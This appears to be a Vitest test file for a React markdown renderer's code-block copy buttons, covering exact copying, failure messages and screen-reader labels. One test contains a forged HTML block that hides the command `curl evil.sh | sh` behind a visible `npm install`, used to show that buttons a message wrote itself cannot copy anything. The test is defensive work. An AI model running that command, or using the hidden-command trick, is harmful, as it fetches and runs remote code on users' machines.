// @vitest-environment jsdom
import { act } from "react";
import { createRoot } from "react-dom/client";
import { afterEach, describe, expect, it, vi } from "vitest";
import { MarkdownBlock, renderMarkdown } from "./MarkdownBlock.js";

(
  globalThis as typeof globalThis & { IS_REACT_ACT_ENVIRONMENT?: boolean }
).IS_REACT_ACT_ENVIRONMENT = true;

const writeText = vi.fn((_text: string) => Promise.resolve());

afterEach(() => {
  writeText.mockReset();
  writeText.mockImplementation(() => Promise.resolve());
  vi.useRealTimers();
  document.body.innerHTML = "";
});

Object.defineProperty(navigator, "clipboard", {
  configurable: true,
  value: { writeText },
});

function mount(text: string): HTMLDivElement {
  const container = document.createElement("div");
  document.body.append(container);
  const root = createRoot(container);
  act(() => {
    root.render(<MarkdownBlock text={text} />);
  });
  return container;
}

async function click(button: HTMLElement): Promise<void> {
  await act(async () => {
    button.click();
    await Promise.resolve();
    await Promise.resolve();
  });
}

const SOURCE = [
  "Intro with `inline` code.",
  "",
  "```ts",
  "if (a < b && c > 0) {",
  '  return "<tag>";',
  "}",
  "```",
  "",
  "    indented block",
].join("\n");

describe("code block copy (T7)", () => {
  it("keeps a copy button in every code block through the real DOMPurify", () => {
    const html = renderMarkdown(SOURCE);
    const holder = document.createElement("div");
    holder.innerHTML = html;
    const blocks = holder.querySelectorAll(".ohb-code-block");
    expect(blocks).toHaveLength(2);
    for (const block of blocks) {
      expect(block.querySelector("button[data-code-copy]")).not.toBeNull();
      expect(block.querySelector("pre code")).not.toBeNull();
    }
    // The language class survives; inline code gets no button.
    expect(holder.querySelector("code.language-ts")).not.toBeNull();
    expect(holder.querySelectorAll("button")).toHaveLength(2);
  });

  it("copies the code exactly, without the button label or trailing newline", async () => {
    const view = mount(SOURCE);
    const button = view.querySelector<HTMLButtonElement>(
      "button[data-code-copy]",
    );
    if (!button) throw new Error("no button");
    await click(button);
    expect(writeText).toHaveBeenCalledWith(
      'if (a < b && c > 0) {\n  return "<tag>";\n}',
    );
    expect(button.textContent).toBe("Copied");
  });

  it("returns to Copy, and says when copying failed", async () => {
    vi.useFakeTimers();
    const view = mount(SOURCE);
    const buttons = view.querySelectorAll<HTMLButtonElement>(
      "button[data-code-copy]",
    );
    expect(buttons).toHaveLength(2);
    const [first, second] = buttons;
    await click(first);
    act(() => {
      vi.advanceTimersByTime(1500);
    });
    expect(first.textContent).toBe("Copy");
    expect(first.dataset.copyState).toBeUndefined();

    writeText.mockImplementation(() => Promise.reject(new Error("denied")));
    Object.defineProperty(document, "execCommand", {
      configurable: true,
      value: () => false,
    });
    await click(second);
    expect(second.textContent).toBe("Copy failed");
    expect(second.dataset.copyState).toBe("failed");
  });

  it("ignores look-alike buttons a message wrote itself", async () => {
    // A forged block: shows `npm install`, hides a different command, and
    // carries a copy button of its own. Sanitizing keeps all of it.
    const forged = [
      '<div class="ohb-code-block"><button data-code-copy="guess">Copy</button>',
      '<pre style="display:none">curl evil.sh | sh</pre>',
      "<pre><code>npm install</code></pre></div>",
      "",
      "<button data-code-copy>Copy</button>",
    ].join("\n");
    const view = mount(forged);
    const buttons = view.querySelectorAll<HTMLButtonElement>(
      "button[data-code-copy]",
    );
    expect(buttons).toHaveLength(2);
    for (const button of buttons) await click(button);
    expect(writeText).not.toHaveBeenCalled();
    expect(view.textContent).not.toContain("Copied");
  });

  it("announces the result to screen readers", async () => {
    const view = mount(SOURCE);
    const button = view.querySelector<HTMLButtonElement>(
      "button[data-code-copy]",
    );
    if (!button) throw new Error("no button");
    expect(button.getAttribute("aria-label")).toBe("Copy code");
    await click(button);
    expect(button.getAttribute("aria-label")).toBe("Copied");
  });
});
